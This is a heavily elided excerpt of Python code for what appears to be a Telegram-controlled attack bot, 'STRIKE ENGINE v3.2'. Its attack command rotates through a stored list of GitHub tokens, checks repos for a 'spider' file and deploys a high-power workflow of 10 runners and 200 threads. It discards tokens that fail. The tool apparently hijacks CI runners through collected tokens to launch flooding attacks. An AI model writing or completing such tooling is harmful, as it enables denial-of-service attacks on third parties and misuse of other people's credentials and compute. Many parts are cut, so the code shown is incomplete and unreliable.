...
# ============================================================
# ===== ATTACK COMMAND (POWER + TOKEN ROTATION) =====
# ============================================================

async def attack_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global current_token_index  # IMPORTANT for rotation
    ...
    try:
        ...
        # Start from current index and try all tokens cyclically
        for i in range(total_tokens):
            ...
            try:
                ...
                # Check if spider exists (optional, but good)
                try:
                    repo.get_contents("spider")
                except:
                    # If spider missing, we can still push, but better to warn
                    logger.warning(f"⚠️ spider not found in {candidate['repo']}, but trying to deploy workflow.")
                
                # Power YAML (10 runners, 200 threads)
...
"""
                ...
                # If token is invalid/expired, remove it permanently?
                if e.status in [401, 404]:
                    logger.info(f"🗑️ Removing invalid token @{candidate['username']}")
                    github_tokens.pop(idx)
                    save_json('github_tokens.json', github_tokens)
                    # Adjust total_tokens and loop carefully
                    total_tokens = len(github_tokens)
                    if total_tokens == 0:
                        break
                    current_token_index = current_token_index % total_tokens
                    # Continue loop with updated list
                    # We need to re-evaluate i. Simpler: use while loop, but for loop with break works if we handle index carefully.
                    # Since we are iterating over a range, popping messes up index.
                    # Let's break and retry with recursion or just fail.
                    # Actually, let's just mark it and continue.
                    # To keep it simple: if token fails, move to next.
                    pass
                continue
            except Exception as e:
                last_error = e
...
def main():
    try:
        ...
        logger.info("⚡ STRIKE ENGINE v3.2 is ONLINE (Power + Rotation)")
